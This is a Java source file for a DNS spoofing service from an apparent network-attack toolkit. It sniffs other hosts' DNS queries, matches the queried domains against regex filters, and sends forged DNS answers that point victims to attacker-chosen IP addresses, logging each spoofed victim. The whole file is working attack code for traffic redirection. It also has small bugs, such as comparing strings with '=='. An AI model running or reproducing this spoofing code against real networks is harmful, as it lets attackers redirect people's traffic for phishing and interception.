package org.bitducks.spoofing.services;

import java.net.InetAddress;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import jpcap.packet.Packet;
import jpcap.packet.UDPPacket;

import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.core.rules.DNSIpv4Rule;
import org.bitducks.spoofing.core.rules.NotMyIpPacketRule;
import org.bitducks.spoofing.packet.DNSPacket;
import org.bitducks.spoofing.packet.PacketFactory;

public class DNSService extends Service {
	//private InetAddress falseDefaultIpAddr = null;
	private Map<String, InetAddress> dnsPacketFilter = new HashMap<String, InetAddress>();
	
	public DNSService() {
		super();
		this.getPolicy().addRule(new DNSIpv4Rule());
		this.getPolicy().addRule(new NotMyIpPacketRule(Server.getInstance().getInfo().getAddress()));
		
		this.getPolicy().setStrict(true);
		
		// TODO Get our IP or the IP provided
		//this.setDNSFalseIp(Server.getInstance().getInfo().getAddress());
	}
	
	/*public void setDNSFalseIp(String falseHostIp) {
		try {
			this.setDNSFalseIp(InetAddress.getByName(falseHostIp));
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}		
	}
	
	public void setDNSFalseIp(InetAddress falseHostIp) {
		this.falseDefaultIpAddr = falseHostIp;
	}*/
	
	public void addDnsPacketFilter(String regex, InetAddress addr) {
		this.dnsPacketFilter.put(regex, addr);
	}
	
	public void removeDnsPacketFilter(String regex) {
		this.dnsPacketFilter.remove(regex);
	}
	
	/**
	 *  the newRegex and addr field must be filled with old value if not changed
	 * @param oldRegex
	 * @param newRegex
	 * @param addr
	 */
	public void editDnsPacketFilter(String oldRegex, String newRegex, InetAddress addr) {
		this.dnsPacketFilter.remove(oldRegex.replace("*", ".*"));
		this.dnsPacketFilter.put(newRegex.replace("*", ".*"), addr);
	}

	@Override
	public void run() {
		
		this.logger.info("DNS Spoof service is started ...");
		UDPPacket queryPaquet = null;
		// If the packet is an EOF we will not be able to cast it to UPDPacket
		Packet tmpPacket = this.getNextBlockingPacket();
		
		while (!tmpPacket.equals(Packet.EOF)) {
			queryPaquet = (UDPPacket)tmpPacket;
			InetAddress falseIpAddr = null;
			if ((falseIpAddr = this.isDNSPacketMatchingWithFilter(queryPaquet)) != null) {
				
				// Getting the query part of the packet
				byte[] queryData = queryPaquet.data;
				
				ByteBuffer queryBuffer = ByteBuffer.allocate(queryData.length - 12);
				for (int i = 12; i < queryData.length; ++i) {
					queryBuffer.put(queryData[i]);
				}
				
				this.logger.info("Spoof " + this.getWebDNSFromPacket(queryPaquet) + " from " + queryPaquet.src_ip.getHostAddress());				
				
				DNSPacket answerPaquet = PacketFactory.dnsRequest(queryPaquet,
						new byte[] { queryData[0], queryData[1] },   // Transaction
						new byte[] { queryData[4], queryData[5] }, // Question
						queryBuffer.array(), 
						falseIpAddr);
				
				
				this.sendDNSPacket(answerPaquet);
			}
			
			tmpPacket = this.getNextBlockingPacket();
		}
		
		this.logger.info("DNS Spoof service will shutdown NOW ...");
	}
	
	/**
	 * 
	 * @param p
	 * @return 	InetAddress		The false Ip address to send in the packet, 
	 * 			NULL 			If the list contain something and is not matching with the packet
	 * 			NULL  If the list is empty.
	 */
	public InetAddress isDNSPacketMatchingWithFilter(Packet p) {
		// If empty --
		if (this.dnsPacketFilter.isEmpty()) {
			//return this.falseDefaultIpAddr;
			return null;
		}
		
		String data = this.getWebDNSFromPacket(p);
		boolean foundStar = false;
		
		Iterator<String> it = this.dnsPacketFilter.keySet().iterator();
		// Checking all the filter
		while (it.hasNext()) {
			String regex = it.next();
			if (data.matches(regex)) {
				if (regex == ".*") {
					foundStar = true;
				} else {
					return this.dnsPacketFilter.get(regex);
				}
			}
		}
		
		if (foundStar) {
			return this.dnsPacketFilter.get(".*");
		}
		
		return null;  // When none of the filter are matching
	}
	
	/**
	 * Get Web server address from DNS Query packet
	 * @param p
	 * @return
	 */
	private String getWebDNSFromPacket(Packet p) {
		ByteBuffer buf = ByteBuffer.allocate(p.data.length - 12 - 6);
		for (int i = 13; i < p.data.length - 5; ++i) {
			byte tmpByte = p.data[i];
			if (tmpByte >= 0x21) { // This is a letters
				buf.put(tmpByte);		
			} else {
				buf.put((byte) 0x2e);
			}
			
		}

		return new String(buf.array());
	}
	
	/**
	 * Send a DNS Packet answer
	 * @param packet
	 */
	private void sendDNSPacket(DNSPacket packet) {
		Server.getInstance().sendPacket(packet);
	}

}
